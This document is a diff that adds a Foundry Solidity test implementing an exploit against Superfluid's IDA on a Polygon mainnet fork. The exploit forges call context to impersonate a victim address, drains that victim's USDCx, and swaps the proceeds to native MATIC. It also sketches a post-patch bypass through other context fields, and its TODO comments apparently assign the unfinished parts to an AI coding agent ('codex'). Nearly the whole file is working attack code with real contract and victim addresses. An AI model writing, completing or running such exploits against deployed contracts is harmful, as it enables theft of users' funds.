@@ -1,0 +1,319 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.23;
+
+import "forge-std/Test.sol";
+import { ContextUtils } from "reference/ContextUtils.sol";
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Unified Superfluid v1 (ch4) / v2 (ch5) context-forgery PoC.
+//
+// Base: reference/IDAUsage_t.sol (interface declarations copied here verbatim;
+// upstream file remains the canonical happy-path reference).
+//
+//   v1 (unpatched): authorizeTokenAccess does not validate ctx stamp.
+//     Attacker forges ctx.msgSender = victim, splices past the
+//     placeholder via trailing bytes so Host replaces an empty
+//     tail instead of the forged ctx word.
+//
+//   v2 (Patch 1 applied): isCtxValid check added to authorizeTokenAccess —
+//     BUT IDA.claim() never calls authorizeTokenAccess. The bypass uses
+//     ctx fields OTHER than msgSender (which is authoritatively overwritten
+//     in the claim path). Candidate fields:
+//       (a) appCreditGranted  — credit allowance for SuperApp callback
+//       (b) appCreditUsed     — signed int, can be pushed negative
+//       (c) appAddress        — forwarded as callback target identity
+//       (d) appCreditToken    — token the credit applies to
+// ─────────────────────────────────────────────────────────────────────────────
+
+interface ISuperAgreement {}
+
+interface ISuperToken {
+    function balanceOf(address) external view returns (uint256);
+    function symbol() external view returns (string memory);
+    function decimals() external view returns (uint8);
+    function downgrade(uint256 amount) external;
+    function transfer(address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface ISETH is ISuperToken {
+    function upgradeByETH() external payable;
+    function downgradeToETH(uint256 wad) external;
+}
+
+interface ISuperfluid {
+    function callAgreement(
+        ISuperAgreement agreementClass,
+        bytes calldata callData,
+        bytes calldata userData
+    ) external returns (bytes memory returnedData);
+
+    function registerApp(uint256 configWord) external;
+}
+
+interface IInstantDistributionAgreementV1 is ISuperAgreement {
+    function createIndex(ISuperToken token, uint32 indexId, bytes calldata ctx) external returns (bytes memory);
+    function updateIndex(ISuperToken token, uint32 indexId, uint128 indexValue, bytes calldata ctx) external returns (bytes memory);
+    function distribute(ISuperToken token, uint32 indexId, uint256 amount, bytes calldata ctx) external returns (bytes memory);
+    function approveSubscription(ISuperToken token, address publisher, uint32 indexId, bytes calldata ctx) external returns (bytes memory);
+    function updateSubscription(ISuperToken token, uint32 indexId, address subscriber, uint128 units, bytes calldata ctx) external returns (bytes memory);
+    function claim(ISuperToken token, address publisher, uint32 indexId, address subscriber, bytes calldata ctx) external returns (bytes memory);
+
+    function getIndex(ISuperToken token, address publisher, uint32 indexId)
+        external view returns (bool exist, uint128 indexValue, uint128 totalUnitsApproved, uint128 totalUnitsPending);
+    function getSubscription(ISuperToken token, address publisher, uint32 indexId, address subscriber)
+        external view returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
+}
+
+interface IERC20 {
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function decimals() external view returns (uint8);
+}
+
+interface IWMATIC is IERC20 {
+    function withdraw(uint256) external;
+    function deposit() external payable;
+}
+
+interface IUniswapV3Router {
+    struct ExactInputSingleParams {
+        address tokenIn;
+        address tokenOut;
+        uint24  fee;
+        address recipient;
+        uint256 deadline;
+        uint256 amountIn;
+        uint256 amountOutMinimum;
+        uint160 sqrtPriceLimitX96;
+    }
+    function exactInputSingle(ExactInputSingleParams calldata) external payable returns (uint256 amountOut);
+}
+
+contract SuperfluidExploitTest is Test {
+    // ── Addresses (Polygon mainnet fork) ──────────────────────────────
+    ISuperfluid                       constant HOST   = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
+    IInstantDistributionAgreementV1   constant IDA    = IInstantDistributionAgreementV1(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
+    ISETH                             constant MATICX = ISETH(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);
+    ISuperToken                       constant USDCX  = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);
+    IERC20                            constant USDC   = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
+    IWMATIC                           constant WMATIC = IWMATIC(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
+    IUniswapV3Router                  constant UNIV3  = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+
+    // Example victim from knowledge/case_superfluid_v1.md — replace with
+    // recon/victims.json output once enumerate_victims runs.
+    address constant VICTIM = 0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188;
+
+    // ── Setup ────────────────────────────────────────────────────────
+    address attacker = vm.addr(uint256(keccak256("attacker")));
+    // v1 fork block from knowledge/case_superfluid_v1.md (tried 24684668 / 24684651).
+    uint256 constant FORK_BLOCK_V1 = 24_684_668;
+    // v2 block: challenge RPC decides; default to v1+ε until recon pins it.
+    uint256 constant FORK_BLOCK_V2 = 24_684_668;
+
+    uint32 constant INDEX_ID = 42;
+
+    function setUp() public {
+        // v1/v2 share RPC alias pattern; each test selects its own fork.
+    }
+
+    // ─────────────────────────────────────────────────────────────────
+    // v1 — ctx forgery via ABI trailing bytes
+    // ─────────────────────────────────────────────────────────────────
+    function test_exploit_v1_ctx_forgery() public {
+        vm.createSelectFork("ch4", FORK_BLOCK_V1);
+        vm.deal(attacker, 1 ether);
+        uint256 balBefore = attacker.balance;
+        console.log("ATTACKER_NATIVE_BEFORE:", balBefore);
+
+        vm.startPrank(attacker);
+
+        // 1. Build fakeCtx with msgSender = VICTIM.
+        bytes memory fakeCtx = _encodeFakeContext(
+            VICTIM,
+            IDA.createIndex.selector,
+            0,              // appCreditGranted
+            0,              // appCreditUsed
+            address(0),     // appAddress
+            address(0)      // appCreditToken
+        );
+
+        // 2. createIndex with forged publisher.
+        _callAgreementWithTrailingBytes(
+            abi.encodeCall(IDA.createIndex, (USDCX, INDEX_ID, fakeCtx))
+        );
+
+        // 3. updateSubscription — grant ALL units to attacker under victim's index.
+        _callAgreementWithTrailingBytes(
+            abi.encodeCall(
+                IDA.updateSubscription,
+                (USDCX, INDEX_ID, attacker, type(uint128).max, fakeCtx)
+            )
+        );
+
+        // 4. distribute (or updateIndex) — drain victim's USDCx balance.
+        uint256 victimBal = USDCX.balanceOf(VICTIM);
+        _callAgreementWithTrailingBytes(
+            abi.encodeCall(IDA.distribute, (USDCX, INDEX_ID, victimBal, fakeCtx))
+        );
+
+        // 5. claim (only required for un-approved subscriptions).
+        // TODO[codex]: skip if already credited via distribute + approved path.
+        // _callAgreementWithTrailingBytes(
+        //     abi.encodeCall(IDA.claim, (USDCX, VICTIM, INDEX_ID, attacker, fakeCtx))
+        // );
+
+        // 6. downgrade USDCx → USDC, swap → WMATIC, unwrap → MATIC.
+        _cashOutUSDCxToNative();
+
+        vm.stopPrank();
+
+        uint256 balAfter = attacker.balance;
+        console.log("ATTACKER_NATIVE_AFTER:", balAfter);
+        console.log("ATTACKER_NATIVE_DELTA:", balAfter - balBefore);
+        assertGt(balAfter, balBefore, "native balance must strictly increase");
+    }
+
+    // ─────────────────────────────────────────────────────────────────
+    // v2 — post-Patch-1: authorizeTokenAccess validates ctx, BUT claim() never
+    // invokes authorizeTokenAccess. msgSender is overwritten in the claim
+    // path, so the bypass has to exploit a DIFFERENT ctx field.
+    // ─────────────────────────────────────────────────────────────────
+    function test_exploit_v2_other_fields() public {
+        vm.createSelectFork("ch5", FORK_BLOCK_V2);
+        vm.deal(attacker, 1 ether);
+        uint256 balBefore = attacker.balance;
+        console.log("ATTACKER_NATIVE_BEFORE:", balBefore);
+
+        vm.startPrank(attacker);
+
+        // TODO[codex]: prep state so pendingDistribution > 0 on claim:
+        //   - attacker becomes publisher of a small index (legit callAgreement)
+        //   - attacker subscribes an attackerSuperApp as subscriber w/ units
+        //   - attacker calls updateIndex to bump indexValue (distribution pending)
+        //   Without pendingDistribution > 0, callAppBeforeCallback is skipped.
+
+        // Craft ctx exploiting one of the 4 candidate fields.
+        // Candidate A — appCreditGranted inflation so the SuperApp callback
+        //               can sub-call host beyond its real allowance.
+        // Candidate B — appCreditUsed set negative → overflow accounting.
+        // Candidate C — appAddress = attacker SuperApp → impersonate identity
+        //               in downstream callback authorization checks.
+        // Candidate D — appCreditToken = a SuperToken the attacker wants to
+        //               drain, so allowance is applied against that token.
+        bytes memory forgedCtx = _encodeFakeContext(
+            attacker,                                      // msgSender (ignored in claim path but kept consistent)
+            IDA.claim.selector,
+            type(uint128).max,                             // (A) appCreditGranted
+            0,                                             // (B) appCreditUsed — flip sign to test negative
+            address(0), /* TODO[codex]: attacker SuperApp */  // (C) appAddress
+            address(USDCX)                                 // (D) appCreditToken
+        );
+
+        // claim() bypasses authorizeTokenAccess → forgedCtx goes straight to
+        // the callback chain.
+        _callAgreementWithTrailingBytes(
+            abi.encodeCall(
+                IDA.claim,
+                (USDCX, /* publisher */ attacker, INDEX_ID, /* subscriber */ attacker, forgedCtx)
+            )
+        );
+
+        // TODO[codex]: inside attacker SuperApp's beforeAgreementUpdated /
+        //   afterAgreementUpdated hooks, invoke host.callAgreementWithContext
+        //   to drain SuperToken balances using the inflated credit allowance.
+        //   That sub-logic lives in the AttackerSuperApp companion contract
+        //   (deployed in setUp of this test file — Codex adds).
+
+        _cashOutUSDCxToNative();
+
+        vm.stopPrank();
+
+        uint256 balAfter = attacker.balance;
+        console.log("ATTACKER_NATIVE_AFTER:", balAfter);
+        console.log("ATTACKER_NATIVE_DELTA:", balAfter - balBefore);
+        assertGt(balAfter, balBefore, "native balance must strictly increase");
+    }
+
+    // ─────────────────────────────────────────────────────────────────
+    // Helpers
+    // ─────────────────────────────────────────────────────────────────
+
+    /// @dev Build a packed Context matching Superfluid's internal layout.
+    ///      All four "v2 candidate" fields are exposed so both tests share
+    ///      one helper.
+    function _encodeFakeContext(
+        address msgSender,
+        bytes4  selector,
+        uint256 appCreditGranted,
+        int256  appCreditUsed,
+        address appAddress,
+        address appCreditToken
+    ) internal view returns (bytes memory) {
+        ContextUtils.Context memory ctx =
+            ContextUtils.buildContext(msgSender, selector, "");
+        ctx.appCreditGranted = appCreditGranted;
+        ctx.appCreditUsed    = appCreditUsed;
+        ctx.appAddress       = appAddress;
+        ctx.appCreditToken   = appCreditToken;
+        return ContextUtils.encodeContext(ctx);
+    }
+
+    /// @dev Host's `_replacePlaceholderCtx` rewrites the LAST bytes argument
+    ///      in calldata. To keep our forged ctx intact, we splice an empty
+    ///      `bytes` after the encoded call — Host replaces THAT instead.
+    ///
+    ///      Layout trick (per superfluid_ctx_struct.md):
+    ///        abi.encodePacked(innerEncodedCall, abi.encode(new bytes(0)))
+    ///      is NOT standard ABI — Host's replacer inspects the tail offset and
+    ///      rewrites the tail word, leaving the real argument untouched.
+    function _callAgreementWithTrailingBytes(bytes memory inner) internal {
+        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));
+        HOST.callAgreement(IDA, outer, "");
+    }
+
+    /// @dev Drain attacker's USDCx → USDC → WMATIC → native MATIC.
+    function _cashOutUSDCxToNative() internal {
+        uint256 usdcxBal = USDCX.balanceOf(attacker);
+        if (usdcxBal > 0) {
+            USDCX.downgrade(usdcxBal);
+        }
+        uint256 usdcBal = USDC.balanceOf(attacker);
+        if (usdcBal > 0) {
+            USDC.approve(address(UNIV3), usdcBal);
+            UNIV3.exactInputSingle(IUniswapV3Router.ExactInputSingleParams({
+                tokenIn:           address(USDC),
+                tokenOut:          address(WMATIC),
+                fee:               500,
+                recipient:         attacker,
+                deadline:          block.timestamp + 60,
+                amountIn:          usdcBal,
+                amountOutMinimum:  0,
+                sqrtPriceLimitX96: 0
+            }));
+        }
+        uint256 wmaticBal = WMATIC.balanceOf(attacker);
+        if (wmaticBal > 0) {
+            WMATIC.withdraw(wmaticBal);
+        }
+        // MATICx → native MATIC (for tokens sourced that way).
+        uint256 maticxBal = MATICX.balanceOf(attacker);
+        if (maticxBal > 0) {
+            MATICX.downgradeToETH(maticxBal);
+        }
+    }
+
+    receive() external payable {}
+
+    /// @notice v1 hypothesis: ISuperfluid.authorizeTokenAccess decodes ctx but
+    ///         does NOT verify keccak256(ctx) == _ctxStamp, so a forged ctx
+    ///         with msgSender = VICTIM is accepted. Trailing-bytes ABI trick
+    ///         keeps the forged ctx from being overwritten by the Host's
+    ///         placeholder replacement.
+    /// @notice v2 hypothesis: Patch 1 plugs msgSender forgery for every path
+    ///         that calls authorizeTokenAccess — but IDA.claim() doesn't. The
+    ///         bypass uses ctx fields that survive into the SuperApp callback
+    ///         chain: appCreditGranted, appCreditUsed, appAddress, appCreditToken.
+    ///         Codex tries each candidate field as a separate Attempt.
+}
